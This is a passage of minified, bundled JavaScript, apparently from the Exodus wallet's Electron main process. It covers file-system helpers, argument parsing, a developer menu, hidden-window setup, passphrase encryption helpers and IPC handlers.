          l = o.resolve(o.dirname(i));
        if (l === a || l === o.parse(l).root) return;
        let f;
        try {
          f = r.statSync(l, { bigint: !0 });
        } catch (e) {
          if ("ENOENT" === e.code) return;
          throw e;
        }
        if (c(n, f)) throw new Error(u(t, i, s));
        return e(t, n, l, s);
      },
      isSrcSubdir: a,
      areIdentical: c,
    };
  },
  function (e, t, n) {
    "use strict";
    const r = n(18).fromCallback,
      o = n(7),
      i = [
        "access",
        "appendFile",
        "chmod",
        "chown",
        "close",
        "copyFile",
        "fchmod",
        "fchown",
        "fdatasync",
        "fstat",
        "fsync",
        "ftruncate",
        "futimes",
        "lchmod",
        "lchown",
        "link",
        "lstat",
        "mkdir",
        "mkdtemp",
        "open",
        "opendir",
        "readdir",
        "readFile",
        "readlink",
        "realpath",
        "rename",
        "rm",
        "rmdir",
        "stat",
        "symlink",
        "truncate",
        "unlink",
        "utimes",
        "writeFile",
      ].filter((e) => "function" == typeof o[e]);
    Object.assign(t, o),
      i.forEach((e) => {
        t[e] = r(o[e]);
      }),
      (t.exists = function (e, t) {
        return "function" == typeof t
          ? o.exists(e, t)
          : new Promise((t) => o.exists(e, t));
      }),
      (t.read = function (e, t, n, r, i, s) {
        return "function" == typeof s
          ? o.read(e, t, n, r, i, s)
          : new Promise((s, c) => {
              o.read(e, t, n, r, i, (e, t, n) => {
                if (e) return c(e);
                s({ bytesRead: t, buffer: n });
              });
            });
      }),
      (t.write = function (e, t, ...n) {
        return "function" == typeof n[n.length - 1]
          ? o.write(e, t, ...n)
          : new Promise((r, i) => {
              o.write(e, t, ...n, (e, t, n) => {
                if (e) return i(e);
                r({ bytesWritten: t, buffer: n });
              });
            });
      }),
      "function" == typeof o.writev &&
        (t.writev = function (e, t, ...n) {
          return "function" == typeof n[n.length - 1]
            ? o.writev(e, t, ...n)
            : new Promise((r, i) => {
                o.writev(e, t, ...n, (e, t, n) => {
                  if (e) return i(e);
                  r({ bytesWritten: t, buffers: n });
                });
              });
        }),
      "function" == typeof o.realpath.native
        ? (t.realpath.native = r(o.realpath.native))
        : process.emitWarning(
            "fs.realpath.native is not a function. Is fs being monkey-patched?",
            "Warning",
            "fs-extra-WARN0003"
          );
  },
  function (e, t) {
    var n, r;
    (n = this),
      (r = function () {
        return function () {
          var e = arguments;
          "object" == typeof arguments[0] && ((e = arguments[0]), arguments[1]);
          var t = [].slice.call(e, 0).join("/");
          return t
            .replace(/:\//g, "://")
            .replace(/([^:\s])\/+/g, "$1/")
            .replace(/\/(\?|&|#[^!])/g, "$1")
            .replace(/(\?.+)\?/g, "$1&");
        };
      }),
      void 0 !== e && e.exports
        ? (e.exports = r())
        : "function" == typeof define && define.amd
        ? define(r)
        : (n.urljoin = r());
  },
  function (e, t, n) {
    "use strict";
    n.d(t, "getIpcType", function () {
      return i;
    }),
      n.d(t, "allIpcWebContents", function () {
        return s;
      }),
      n.d(t, "findWebContents", function () {
        return c;
      });
    var r = n(15),
      o = n(8);
    function i(e) {
      const t = Object(o.getWebContentsMeta)(e);
      return t && !0 === t.ipc ? t.type : void 0;
    }
    function s() {
      return Object(r.allWebContents)()
        .map((e) => ({ contents: e, type: i(e) }))
        .filter((e) => e.type);
    }
    function c(e) {
      return s()
        .filter((t) => t.type === e)
        .map((e) => e.contents);
    }
  },
  function (e, t) {
    function n(e) {
      return (
        "number" == typeof e ||
        !!/^0x[0-9a-f]+$/i.test(e) ||
        /^[-+]?(?:\d+(?:\.\d*)?|\.\d+)(e[-+]?\d+)?$/.test(e)
      );
    }
    function r(e, t) {
      return (
        ("constructor" === t && "function" == typeof e[t]) || "__proto__" === t
      );
    }
    e.exports = function (e, t) {
      t || (t = {});
      var o = { bools: {}, strings: {}, unknownFn: null };
      "function" == typeof t.unknown && (o.unknownFn = t.unknown),
        "boolean" == typeof t.boolean && t.boolean
          ? (o.allBools = !0)
          : []
              .concat(t.boolean)
              .filter(Boolean)
              .forEach(function (e) {
                o.bools[e] = !0;
              });
      var i = {};
      Object.keys(t.alias || {}).forEach(function (e) {
        (i[e] = [].concat(t.alias[e])),
          i[e].forEach(function (t) {
            i[t] = [e].concat(
              i[e].filter(function (e) {
                return t !== e;
              })
            );
          });
      }),
        []
          .concat(t.string)
          .filter(Boolean)
          .forEach(function (e) {
            (o.strings[e] = !0), i[e] && (o.strings[i[e]] = !0);
          });
      var s = t.default || {},
        c = { _: [] };
      Object.keys(o.bools).forEach(function (e) {
        u(e, void 0 !== s[e] && s[e]);
      });
      var a = [];
      function u(e, t, r) {
        if (
          !r ||
          !o.unknownFn ||
          (function (e, t) {
            return (
              (o.allBools && /^--[^=]+$/.test(t)) ||
              o.strings[e] ||
              o.bools[e] ||
              i[e]
            );
          })(e, r) ||
          !1 !== o.unknownFn(r)
        ) {
          var s = !o.strings[e] && n(t) ? Number(t) : t;
          l(c, e.split("."), s),
            (i[e] || []).forEach(function (e) {
              l(c, e.split("."), s);
            });
        }
      }
      function l(e, t, n) {
        for (var i = e, s = 0; s < t.length - 1; s++) {
          if (r(i, (c = t[s]))) return;
          void 0 === i[c] && (i[c] = {}),
            (i[c] !== Object.prototype &&
              i[c] !== Number.prototype &&
              i[c] !== String.prototype) ||
              (i[c] = {}),
            i[c] === Array.prototype && (i[c] = []),
            (i = i[c]);
        }
        var c;
        r(i, (c = t[t.length - 1])) ||
          ((i !== Object.prototype &&
            i !== Number.prototype &&
            i !== String.prototype) ||
            (i = {}),
          i === Array.prototype && (i = []),
          void 0 === i[c] || o.bools[c] || "boolean" == typeof i[c]
            ? (i[c] = n)
            : Array.isArray(i[c])
            ? i[c].push(n)
            : (i[c] = [i[c], n]));
      }
      function f(e) {
        return i[e].some(function (e) {
          return o.bools[e];
        });
      }
      -1 !== e.indexOf("--") &&
        ((a = e.slice(e.indexOf("--") + 1)), (e = e.slice(0, e.indexOf("--"))));
      for (var d = 0; d < e.length; d++) {
        var p = e[d];
        if (/^--.+=/.test(p)) {
          var h = p.match(/^--([^=]+)=([\s\S]*)$/),
            m = h[1],
            y = h[2];
          o.bools[m] && (y = "false" !== y), u(m, y, p);
        } else if (/^--no-.+/.test(p)) {
          u((m = p.match(/^--no-(.+)/)[1]), !1, p);
        } else if (/^--.+/.test(p)) {
          m = p.match(/^--(.+)/)[1];
          void 0 === (E = e[d + 1]) ||
          /^-/.test(E) ||
          o.bools[m] ||
          o.allBools ||
          (i[m] && f(m))
            ? /^(true|false)$/.test(E)
              ? (u(m, "true" === E, p), d++)
              : u(m, !o.strings[m] || "", p)
            : (u(m, E, p), d++);
        } else if (/^-[^-]+/.test(p)) {
          for (
            var w = p.slice(1, -1).split(""), b = !1, g = 0;
            g < w.length;
            g++
          ) {
            var E;
            if ("-" !== (E = p.slice(g + 2))) {
              if (/[A-Za-z]/.test(w[g]) && /=/.test(E)) {
                u(w[g], E.split("=")[1], p), (b = !0);
                break;
              }
              if (/[A-Za-z]/.test(w[g]) && /-?\d+(\.\d*)?(e-?\d+)?$/.test(E)) {
                u(w[g], E, p), (b = !0);
                break;
              }
              if (w[g + 1] && w[g + 1].match(/\W/)) {
                u(w[g], p.slice(g + 2), p), (b = !0);
                break;
              }
              u(w[g], !o.strings[w[g]] || "", p);
            } else u(w[g], E, p);
          }
          m = p.slice(-1)[0];
          b ||
            "-" === m ||
            (!e[d + 1] ||
            /^(-|--)[^-]/.test(e[d + 1]) ||
            o.bools[m] ||
            (i[m] && f(m))
              ? e[d + 1] && /^(true|false)$/.test(e[d + 1])
                ? (u(m, "true" === e[d + 1], p), d++)
                : u(m, !o.strings[m] || "", p)
              : (u(m, e[d + 1], p), d++));
        } else if (
          ((o.unknownFn && !1 === o.unknownFn(p)) ||
            c._.push(o.strings._ || !n(p) ? p : Number(p)),
          t.stopEarly)
        ) {
          c._.push.apply(c._, e.slice(d + 1));
          break;
        }
      }
      return (
        Object.keys(s).forEach(function (e) {
          var t, n, r;
          (t = c),
            (n = e.split(".")),
            (r = t),
            n.slice(0, -1).forEach(function (e) {
              r = r[e] || {};
            }),
            n[n.length - 1] in r ||
              (l(c, e.split("."), s[e]),
              (i[e] || []).forEach(function (t) {
                l(c, t.split("."), s[e]);
              }));
        }),
        t["--"]
          ? ((c["--"] = new Array()),
            a.forEach(function (e) {
              c["--"].push(e);
            }))
          : a.forEach(function (e) {
              c._.push(e);
            }),
        c
      );
    };
  },
  function (e, t, n) {
    "use strict";
    n.d(t, "setDefaultProtocols", function () {
      return a;
    }),
      n.d(t, "removeDefaultProtocols", function () {
        return u;
      });
    var r = n(0),
      o = n(2),
      i = n(22),
      s = n.n(i);
    const c = [o.PROTOCOL];
    function a() {
      s.a.beginEvent("setDefaultProtocols"),
        c.forEach((e) =>
          r.app.setAsDefaultProtocolClient(e, process.execPath, ["--"])
        ),
        s.a.endEvent("setDefaultProtocols");
    }
    function u() {
      c.forEach((e) =>
        r.app.removeAsDefaultProtocolClient(e, process.execPath, ["--"])
      );
    }
  },
  function (e, t) {
    var n = 1e3,
      r = 60 * n,
      o = 60 * r,
      i = 24 * o,
      s = 365.25 * i;
    function c(e, t, n) {
      if (!(e < t))
        return e < 1.5 * t
          ? Math.floor(e / t) + " " + n
          : Math.ceil(e / t) + " " + n + "s";
    }
    e.exports = function (e, t) {
      t = t || {};
      var a,
        u = typeof e;
      if ("string" === u && e.length > 0)
        return (function (e) {
          if ((e = String(e)).length > 1e4) return;
          var t =
            /^((?:\d+)?\.?\d+) *(milliseconds?|msecs?|ms|seconds?|secs?|s|minutes?|mins?|m|hours?|hrs?|h|days?|d|years?|yrs?|y)?$/i.exec(
              e
            );
          if (!t) return;
          var c = parseFloat(t[1]);
          switch ((t[2] || "ms").toLowerCase()) {
            case "years":
            case "year":
            case "yrs":
            case "yr":
            case "y":
              return c * s;
            case "days":
            case "day":
            case "d":
              return c * i;
            case "hours":
            case "hour":
            case "hrs":
            case "hr":
            case "h":
              return c * o;
            case "minutes":
            case "minute":
            case "mins":
            case "min":
            case "m":
              return c * r;
            case "seconds":
            case "second":
            case "secs":
            case "sec":
            case "s":
              return c * n;
            case "milliseconds":
            case "millisecond":
            case "msecs":
            case "msec":
            case "ms":
              return c;
            default:
              return;
          }
        })(e);
      if ("number" === u && !1 === isNaN(e))
        return t.long
          ? c((a = e), i, "day") ||
              c(a, o, "hour") ||
              c(a, r, "minute") ||
              c(a, n, "second") ||
              a + " ms"
          : (function (e) {
              if (e >= i) return Math.round(e / i) + "d";
              if (e >= o) return Math.round(e / o) + "h";
              if (e >= r) return Math.round(e / r) + "m";
              if (e >= n) return Math.round(e / n) + "s";
              return e + "ms";
            })(e);
      throw new Error(
        "val is not a non-empty string or a valid number. val=" +
          JSON.stringify(e)
      );
    };
  },
  function (e, t, n) {
    "use strict";
    e.exports = t = n(151);
    var r = n(150);
    (t.Byte = r.Byte),
      (t.Int8 = r.Int8),
      (t.UInt8 = r.UInt8),
      (t.Int16BE = r.Int16BE),
      (t.Int16LE = r.Int16LE),
      (t.UInt16BE = r.UInt16BE),
      (t.UInt16LE = r.UInt16LE),
      (t.Int32BE = r.Int32BE),
      (t.Int32LE = r.Int32LE),
      (t.UInt32BE = r.UInt32BE),
      (t.UInt32LE = r.UInt32LE),
      (t.Int64BE = r.Int64BE),
      (t.Int64LE = r.Int64LE),
      (t.UInt64BE = r.UInt64BE),
      (t.UInt64LE = r.UInt64LE),
      (t.FloatBE = r.FloatBE),
      (t.FloatLE = r.FloatLE),
      (t.DoubleBE = r.DoubleBE),
      (t.DoubleLE = r.DoubleLE),
      (t.Array = n(148)),
      (t.VarArray = n(147)),
      (t.Sequence = n(146)),
      (t.Buffer = n(85)),
      (t.VarBuffer = n(84)),
      (t.String = n(145)),
      (t.VarString = n(144)),
      (t.Bound = n(143));
  },
  function (e, t, n) {
    "use strict";
    const r = n(17).fromCallback,
      o = n(168);
    e.exports = { remove: r(o), removeSync: o.sync };
  },
  function (e, t, n) {
    "use strict";
    const r = n(7),
      o = n(18).fromCallback,
      i = n(202);
    e.exports = {
      remove: o(function (e, t) {
        if (r.rm) return r.rm(e, { recursive: !0, force: !0 }, t);
        i(e, t);
      }),
      removeSync: function (e) {
        if (r.rmSync) return r.rmSync(e, { recursive: !0, force: !0 });
        i.sync(e);
      },
    };
  },
  function (e, t) {
    e.exports = require("stream");
  },
  function (e, t, n) {
    "use strict";
    var r = n(32),
      o = n.n(r),
      i = n(0),
      s = n(12),
      c = n.n(s),
      a = n(22),
      u = n(28),
      l = n(11),
      f = n(60),
      d = n(59),
      p = n(58),
      h = n(19),
      m = n(41),
      y = n(43);
    function w(e, ...t) {
      if ("function" != typeof e)
        throw new Error("Fist argument should be a function");
      const n = `(${e.toString()})(${t.map((e) => o()(e)).join(", ")})`;
      return () => Object(h.getWindow)().webContents.executeJavaScript(n);
    }
    const b = c()([
        "Restore",
        [
          [
            "Restore from 12-word phrase...",
            w(() => globalThis.Exodus.restore.fromRecoveryPhrase()),
          ],
          [
            "Restore from recovery link...",
            w(() => globalThis.Exodus.restore.fromRecoveryLink()),
          ],
          [
            "Restore from Safe Report...",
            w(() => globalThis.Exodus.import.safeReport.importFile()),
          ],
        ],
      ]),
      g = c()([
        "Data Folder",
        [
          [
            "Open Data Folder",
            () => i.shell.showItemInFolder(i.app.getPath("userData")),
          ],
          [
            "Export Zipped Data Folder",
            w(() => globalThis.Exodus.export.dir.data()),
          ],
          [
            "Export Zipped Wallet Folder",
            w(() => globalThis.Exodus.export.dir.wallet()),
          ],
        ],
      ]),
      E = c()([
        "Manage Portfolios",
        [["Enable All", w(() => globalThis.Exodus.portfolios.enableAll())]],
      ]),
      v = c()([
        "Notifications",
        [
          [
            "On",
            { type: "radio", checked: !0 },
            w(() =>
              globalThis.flux.actions.config.notifications.tx.receive.enable()
            ),
          ],
          [
            "Off",
            { type: "radio", checked: !1 },
            w(() =>
              globalThis.flux.actions.config.notifications.tx.receive.disable()
            ),
          ],
        ],
      ]),
      S = c()([
        "Sound",
        [
          [
            "Volume",
            [...Array(10).keys()]
              .map((e) => 10 * (e + 1))
              .map((e) => [
                `${e}%`,
                { type: "radio", checked: 100 === e },
                w(
                  (e) => globalThis.flux.actions.config.sounds.all.setVolume(e),
                  e / 100
                ),
              ]),
          ],
          [
            "Test Volume Level",
            w(() => globalThis.flux.store.dispatch({ type: "TEST_VOLUME" })),
          ],
        ],
      ]),
      O = (e) => {
        const t = `(${((e) =>
          globalThis.flux.actions.config.updateZoomFactor(
            e
          )).toString()})(${o()(e)})`;
        Object(h.getWindow)().webContents.executeJavaScript(t);
      },
      k = c()([
        "Zoom",
        [
          ["50%", { type: "radio", checked: !1 }, () => O(0.5)],
          ["75%", { type: "radio", checked: !1 }, () => O(0.75)],
          ["100%", { type: "radio", checked: !0 }, () => O(1)],
          ["150%", { type: "radio", checked: !1 }, () => O(1.5)],
          ["200%", { type: "radio", checked: !1 }, () => O(2)],
          ["300%", { type: "radio", checked: !1 }, () => O(3)],
        ],
      ]),
      _ = c()([
        "Windows",
        [
          [
            "Network",
            [
              [
                "Visible",
                { type: "checkbox", checked: !1 },
                (e) => {
                  const t = Object(p.getWindow)();
                  t.isVisible() ? t.hide() : t.show(),
                    (e.checked = t.isVisible());
                },
              ],
            ],
          ],
          [
            "Wallet",
            [
              [
                "Visible",
                { type: "checkbox", checked: !1 },
                (e) => {
                  const t = Object(y.getWindow)();
                  t.isVisible() ? t.hide() : t.show(),
                    (e.checked = t.isVisible());
                },
              ],
            ],
          ],
          [
            "Monero",
            [
              [
                "Visible",
                { type: "checkbox", checked: !1 },
                (e) => {
                  const t = Object(d.getWindow)();
                  t.isVisible() ? t.hide() : t.show(),
                    (e.checked = t.isVisible());
                },
              ],
            ],
          ],
          [
            "Core",
            [
              [
                "Visible",
                { type: "checkbox", checked: !1 },
                (e) => {
                  const t = Object(f.getWindow)();
                  t.isVisible() ? t.hide() : t.show(),
                    (e.checked = t.isVisible());
                },
              ],
            ],
          ],
          [
            "Unlock",
            [
              [
                "Dev Tools Visible",
                { type: "checkbox", checked: !1 },
                (e) => {
                  const t = Object(m.getWindow)();
                  (e.checked = !t.webContents.isDevToolsOpened()),
                    t.webContents.isDevToolsOpened()
                      ? t.webContents.closeDevTools()
                      : t.webContents.openDevTools();
                },
              ],
            ],
          ],
        ],
      ]),
      x = c()([
        "Debug Mode",
        [
          [
            "On",
            { type: "radio", checked: u.isExistsSync() },
            function () {
              u.isExistsSync() || C();
            },
          ],
          [
            "Off",
            { type: "radio", checked: !u.isExistsSync() },
            function () {
              u.isExistsSync() && C();
            },
          ],
        ],
      ]);
    function C() {
      u[u.isExistsSync() ? "remove" : "create"](async (e) => {
        e
          ? await i.dialog.showMessageBox({
              title: "Restart",
              message: `Debug mode is now ${
                u.isExistsSync() ? "on" : "off"
              }. Please restart Exodus to activate the changes.`,
              buttons: ["OK"],
            })
          : await i.dialog.showMessageBox({
              title: "Error",
              message: "There was a problem! Debug mode could not be changed!",
              buttons: ["OK"],
            });
      });
    }
    t.default = c()([
      "Developer",
      [
        b,
        g,
        v,
        S,
        _,
        k,
        "-",
        ["Open Developer Tools", () => Object(l.default)()],
        [
          "Open Current App Developer Tools",
          w(() => globalThis.Exodus.dapps.showDevTools()),
        ],
        x,
        "-",
        [
          "Export Safe Report Data",
          w(() => globalThis.Exodus.export.safeReport.dumpDiagnostics()),
        ],
        ...(a.PERF_METRICS_FEATURES
          ? [
              [
                "Export Performance Metrics",
                w(() =>
                  globalThis.Exodus.export.performanceMetrics.exportToFile()
                ),
              ],
            ]
          : []),
        [
          "Export All Transactions",
          w(() =>
            globalThis.Exodus.export.transactions.exportTransactionsAllWalletAccounts()
          ),
        ],
        E,
      ],
    ]);
  },
  function (e, t, n) {
    "use strict";
    n.d(t, "getWindow", function () {
      return f;
    }),
      n.d(t, "init", function () {
        return d;
      });
    var r = n(0),
      o = n(8),
      i = n(11),
      s = n(14),
      c = n(5),
      a = n(10);
    const u = {
      ...a.default,
      backgroundColor: "#fff",
      x: 0,
      y: 0,
      fullscreen: !1,
      fullscreenable: !1,
      maximizable: !1,
      minimizable: !1,
      resizable: !0,
      show: !1,
      skipTaskbar: !1,
      title: "Network Process (hidden window)",
      webPreferences: {
        ...a.isolation,
        partition: "persist:network",
        backgroundThrottling: !1,
      },
    };
    let l = null;
    const f = () => l;
    function d() {
      const e = r.screen.getPrimaryDisplay().size,
        t = { ...u, width: e.width / 3, height: e.height / 2 };
      (l = new r.BrowserWindow(t)),
        Object(o.registerWebContents)(l.webContents, "network"),
        Object(s.forwardErrors)(l.webContents, "network"),
        l.loadFile(c.WINDOW_NETWORK),
        Object(i.default)({ windowHandle: l.webContents, windowId: "network" }),
        l.webContents.on("will-navigate", (e) => {
          e.preventDefault();
        });
      let n = !1;
      return (
        r.app.on("before-quit", () => {
          (n = !0), l.isDestroyed() || l.close();
        }),
        l.on("close", function (e) {
          n || (e.preventDefault(), l.hide());
        }),
        l
      );
    }
  },
  function (e, t, n) {
    "use strict";
    n.d(t, "getWindow", function () {
      return f;
    }),
      n.d(t, "init", function () {
        return d;
      });
    var r = n(0),
      o = n(8),
      i = n(11),
      s = n(14),
      c = n(5),
      a = n(10);
    const u = {
      ...a.default,
      x: 0,
      y: 0,
      backgroundColor: "#fff",
      width: 1120,
      height: 980,
      minWidth: 300,
      minHeight: 400,
      show: !1,
      title: "Monero Process (hidden window)",
      webPreferences: {
        ...a.integration,
        partition: "persist:monero",
        backgroundThrottling: !1,
      },
    };
    let l = null;
    const f = () => l;
    function d(e) {
      const t = r.screen.getPrimaryDisplay().size,
        n = { ...u, width: t.width / 3, height: t.height / 2 };
      (l = new r.BrowserWindow(n)),
        Object(o.registerWebContents)(l.webContents, "monero"),
        Object(s.forwardErrors)(l.webContents, "monero"),
        l.loadFile(c.WINDOW_MONERO),
        Object(i.default)({ windowHandle: l.webContents, windowId: "monero" });
      let a = !1;
      return (
        r.app.on("before-quit", () => {
          (a = !0), l.isDestroyed() || l.close();
        }),
        l.on("close", function (e) {
          a || (e.preventDefault(), l.hide());
        }),
        l
      );
    }
  },
  function (e, t, n) {
    "use strict";
    n.d(t, "getWindow", function () {
      return y;
    }),
      n.d(t, "init", function () {
        return w;
      });
    var r = n(108),
      o = n(0),
      i = n(30),
      s = n.n(i),
      c = n(33),
      a = n(37),
      u = n(5),
      l = n(8),
      f = n(11),
      d = n(14),
      p = n(10);
    const h = {
      ...p.default,
      backgroundColor: "#fff",
      x: 0,
      y: 0,
      fullscreen: !1,
      fullscreenable: !1,
      maximizable: !1,
      minimizable: !1,
      resizable: !0,
      show: !1,
      skipTaskbar: !1,
      title: "Core process (hidden window)",
      webPreferences: {
        ...p.integration,
        partition: "core",
        backgroundThrottling: !1,
      },
    };
    let m = null;
    const y = () => m;
    function w() {
      const e = o.screen.getPrimaryDisplay().size,
        t = { ...h, width: e.width / 3, height: e.height / 2 };
      (m = new o.BrowserWindow(t)),
        Object(l.registerWebContents)(m.webContents, "core"),
        Object(d.forwardErrors)(m.webContents, "core"),
        m.loadFile(u.WINDOW_CORE),
        Object(f.default)({ windowHandle: m.webContents, windowId: "core" }),
        m.webContents.on("will-navigate", (e) => {
          e.preventDefault();
        });
      let n = !1;
      return (
        o.app.on("before-quit", (e) => {
          const t = Object(c.default)(Object(a.walletDir)()),
            i = `${t.infoFile}.lock`,
            u = s.a.existsSync(i),
            l = Object(r.isStorageWriting)(t.storageFile);
          u || l
            ? (u && console.log(`${i} exists.`),
              l && console.log("storage.seco is still writing"),
              e.preventDefault(),
              setTimeout(() => o.app.quit(), 2e3))
            : ((n = !0), m.isDestroyed() || m.close());
        }),
        m.on("close", function (e) {
          n || (e.preventDefault(), m.hide());
        }),
        m
      );
    }
  },
  function (e, t) {
    e.exports = require("child_process");
  },
  function (e, t, n) {
    "use strict";
    n.d(t, "isDeepLink", function () {
      return i;
    }),
      n.d(t, "maybeDeepLink", function () {
        return s;
      });
    var r = n(2),
      o = n(3);
    const i = (e) => {
        return new RegExp(`^${r.PROTOCOL}://fiat-(on|off)ramp`).test(e);
      },
      s = (e) => {
        if (!e || !i(e)) return;
        const {
          host: t,
          path: n,
          params: r,
        } = ((e) => {
          const { hostname: t, pathname: n, searchParams: r } = new URL(e);
          return {
            host: t,
            path: n.slice(1),
            params: Object.fromEntries(r.entries()),
          };
        })(e);
        o.appWindows.ui.webContents.send("fiat-onramp:data", {
          host: t,
          path: n,
          params: r,
        }),
          o.appWindows.background.show();
      };
  },
  function (e, t, n) {
    "use strict";
    var r = n(0),
      o = n(4),
      i = n(98),
      s = n(75),
      c = n(57),
      a = n(96),
      u = n(95);
    const l = [s.default];
    l.push(a.default),
      "darwin" !== process.platform && l.push(c.default),
      l.push(u.default);
    const f = r.Menu.buildFromTemplate(l),
      d = () =>
        "darwin" === process.platform
          ? h(h(f, s.appName).submenu, "Developer").submenu
          : h(f, "Developer").submenu,
      p = (e, t) => {
        e.items.forEach((e) => t(e)),
          e.items
            .map((e) => e.submenu)
            .filter((e) => e)
            .forEach((e) => p(e, t));
      };
    o.rpcMain.once("two-factor:enabled", async () => {
      const e = d();
      p(e, (e) => {
        e.exodusIncompatibleWithTwoFactorAuth && (e.enabled = !1);
      });
    });
    const h = (e, t) => e.items.find((e) => e.label === t);
    o.rpcMain.on(
      "config:notifications",
      (
        e,
        {
          volumeLevel: t,
          notificationsTxReceivedEnabled: n,
          zoomFactor: r,
          onStartup: o,
        }
      ) => {
        const s = d();
        h(h(s, "Notifications").submenu, n ? "On" : "Off").checked = !0;
        const c = h(s, "Sound"),
          a = h(c.submenu, "Volume");
        h(a.submenu, `${parseInt(100 * t)}%`).checked = !0;
        const u = h(s, "Zoom");
        h(u.submenu, `${parseInt(100 * r)}%`).checked = !0;
        const l = !o;
        Object(i.default)(r, l);
      }
    ),
      (t.default = f);
  },
  function (e, t, n) {
    e.exports = n(56);
  },
  function (e, t, n) {
    "use strict";
    Object.defineProperty(t, "__esModule", { value: !0 }),
      (t.vsf = function e(t) {
        return t.map((t) => ({
          name: t[0],
          type: Array.isArray(t[1]) ? (0, i.default)(e(t[1])) : t[1],
        }));
      }),
      (t.CStr = function (e, t = "utf8") {
        let n = (0, o.Buffer)(e);
        function r(r, o, i) {
          let s = Buffer.alloc(e);
          return s.write(r, t), n.encode(s, o, i);
        }
        function i(e, r, o) {
          let i = n.decode(e, r, o),
            s = 0;
          for (; s < i.length && 0 !== i[s]; s++);
          return i.slice(0, s).toString(t);
        }
        return (
          (r.bytes = i.bytes = e),
          { encode: r, decode: i, encodingLength: () => e }
        );
      });
    var r,
      o = n(53),
      i = (r = o) && r.__esModule ? r : { default: r };
  },
  function (e, t, n) {
    "use strict";
    Object.defineProperty(t, "__esModule", { value: !0 }),
      (t.IV_LEN_BYTES = void 0);
    var r =
      Object.assign ||
      function (e) {
        for (var t = 1; t < arguments.length; t++) {
          var n = arguments[t];
          for (var r in n)
            Object.prototype.hasOwnProperty.call(n, r) && (e[r] = n[r]);
        }
        return e;
      };
    (t.createScryptParams = a),
      (t.stretchPassphrase = u),
      (t.aesEncrypt = l),
      (t.aesDecrypt = f),
      (t.boxEncrypt = function (e, t, n) {
        const { key: r, salt: o } = u(e, n),
          { authTag: i, blob: s, iv: c } = l(r, t);
        return { authTag: i, blob: s, iv: c, salt: o };
      }),
      (t.boxDecrypt = function (e, t, { iv: n, authTag: o }, i) {
        i = r({}, a(), i);
        const { key: s } = u(e, i);
        return f(s, t, { iv: n, authTag: o });
      }),
      (t.sha256 = function (e) {
        return o.default.createHash("sha256").update(e).digest();
      });
    var o = s(n(31)),
      i = s(n(152));
    function s(e) {
      return e && e.__esModule ? e : { default: e };
    }
    const c = (t.IV_LEN_BYTES = 12);
    function a(e = {}) {
      return r({ salt: o.default.randomBytes(32), n: 16384, r: 8, p: 1 }, e);
    }
    function u(e, { salt: t, n: n, r: r, p: o } = a()) {
      return { key: (0, i.default)(e, t, n, r, o, 32), salt: t };
    }
    function l(
      e,
      t,
      n = { cipher: "aes-256-gcm", iv: o.default.randomBytes(c) }
    ) {
      const r = o.default.createCipheriv(n.cipher, e, n.iv),
        i = Buffer.concat([r.update(t), r.final()]);
      return { authTag: r.getAuthTag(), blob: i, iv: n.iv };
    }
    function f(e, t, { cipher: n = "aes-256-gcm", iv: r, authTag: i } = {}) {
      const s = o.default.createDecipheriv(n, e, r);
      return s.setAuthTag(i), Buffer.concat([s.update(t), s.final()]);
    }
  },
  function (e, t, n) {
    "use strict";
    const r = n(17).fromCallback,
      o = n(166);
    e.exports = {
      readJson: r(o.readFile),
      readJsonSync: o.readFileSync,
      writeJson: r(o.writeFile),
      writeJsonSync: o.writeFileSync,
    };
  },
  function (e, t, n) {
    "use strict";
    const r = n(18).fromCallback,
      o = n(7),
      i = n(1),
      s = n(23),
      c = n(39).pathExists;
    e.exports = {
      outputFile: r(function (e, t, n, r) {
        "function" == typeof n && ((r = n), (n = "utf8"));
        const a = i.dirname(e);
        c(a, (i, c) =>
          i
            ? r(i)
            : c
            ? o.writeFile(e, t, n, r)
            : void s.mkdirs(a, (i) => {
                if (i) return r(i);
                o.writeFile(e, t, n, r);
              })
        );
      }),
      outputFileSync: function (e, ...t) {
        const n = i.dirname(e);
        if (o.existsSync(n)) return o.writeFileSync(e, ...t);
        s.mkdirsSync(n), o.writeFileSync(e, ...t);
      },
    };
  },
  function (e, t) {
    e.exports = {
      stringify: function (
        e,
        { EOL: t = "\n", finalEOL: n = !0, replacer: r = null, spaces: o } = {}
      ) {
        const i = n ? t : "";
        return JSON.stringify(e, r, o).replace(/\n/g, t) + i;
      },
      stripBom: function (e) {
        return (
          Buffer.isBuffer(e) && (e = e.toString("utf8")),
          e.replace(/^\uFEFF/, "")
        );
      },
    };
  },
  function (e, t, n) {
    "use strict";
    const r = n(18).fromCallback;
    e.exports = { copy: r(n(207)), copySync: n(204) };
  },
  function (e, t) {
    e.exports = require("assert");
  },
  function (e, t) {
    e.exports = require("module");
  },
  function (e, t) {
    e.exports = require("zlib");
  },
  function (e) {
    e.exports = {
      name: "exodus",
      productName: "Exodus",
      version: "23.11.6",
      description: "Secure, manage, and trade blockchain assets.",
    };
  },
  function (e, t, n) {
    "use strict";
    n.d(t, "appName", function () {
      return a;
    });
    var r = n(0),
      o = n(12),
      i = n.n(o),
      s = n(2),
      c = n(57);
    const a = (() =>
      s.ENV_BUILD_EXODUS
        ? "Exodus"
        : s.ENV_BUILD_EDEN
        ? "Eden"
        : s.ENV_BUILD_NAME)();
    let u;
    (u =
      "darwin" === process.platform
        ? i()([
            a,
            [
              ["About " + a, "about"],
              c.default,
              "-",
              { ...i()(["Services", "services"]), submenu: [] },
              "-",
              ["Hide " + a, "Command+H", "hide"],
              ["Hide Others", "Command+Shift+H", "hideothers"],
              ["Show All", "unhide"],
              "-",
              ["Quit", "Command+Q", r.app.quit.bind(r.app)],
            ].filter((e) => !!e),
          ])
        : i()([
            "File",
            [["Quit", "Command+Q", r.app.quit.bind(r.app)]].filter((e) => !!e),
          ])),
      (t.default = u);
  },
  function (e, t, n) {
    const { app: r, BrowserWindow: o, screen: i, desktopCapturer: s } = n(0),
      c = n(36),
      { browserViewFromWebContents: a, browserWindowFromBrowserView: u } =
        n(15),
      l = { on: new Map(), handle: new Map() };
    l.on.set("app:exit", (e, t) => {
      r.exit(t);
    }),
      l.on.set("app:quit", () => {
        r.quit();
      }),
      l.on.set("app:relaunch", (e, { addArgs: t } = {}) => {
        t
          ? r.relaunch({ args: process.argv.slice(1).concat(t) })
          : r.relaunch(),
          (e.returnValue = 0);
      }),
      l.on.set("app:meta", (e) => {
        e.returnValue = { DEBUG_MODE: globalThis.DEBUG_MODE };
      }),
      l.on.set("app:path", (e, t) => {
        if ("app" === t) e.returnValue = r.getAppPath();
        else {
          if (!["desktop", "userData"].includes(t))
